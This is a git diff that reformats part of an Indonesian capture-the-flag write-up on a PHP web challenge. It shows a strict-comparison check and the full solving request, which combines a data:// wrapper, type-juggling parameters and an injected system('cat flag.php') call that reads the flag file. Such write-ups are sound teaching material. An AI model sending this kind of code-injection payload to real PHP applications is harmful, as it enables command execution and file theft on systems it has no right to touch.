@@ -103,7 +103,7 @@ Selain *path* menuju berkas, fungsi `file_get_contents` juga dapat menerima [pro
 
 ### Strict Comparison
 
-```
+```php
 if(intval($k1) !== $cc || $k1 === $cc){
     die("lol no\n");
 }
@@ -162,4 +162,6 @@ Variabel `$bb` dan `$cc` dapat kita kontrol tetapi `$cc` harus berupa array sehi
 
 Berikut adalah salah satu `request` yang dapat dilakukan untuk mendapatkan flag.
 
-[view-source:https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&key1=1337&key2=1337%EF%BC%8400000000000000000000000000000000000&cc[]=a&k1=2&bb=system(%27cat%20flag.php%27);%20//%20%22](view-source:https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&key1=1337&key2=1337%EF%BC%8400000000000000000000000000000000000&cc[]=a&k1=2&bb=system(%27cat%20flag.php%27);%20//%20%22)
+```
+view-source:https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&key1=1337&key2=1337%EF%BC%8400000000000000000000000000000000000&cc[]=a&k1=2&bb=system(%27cat%20flag.php%27);%20//%20%22
+```
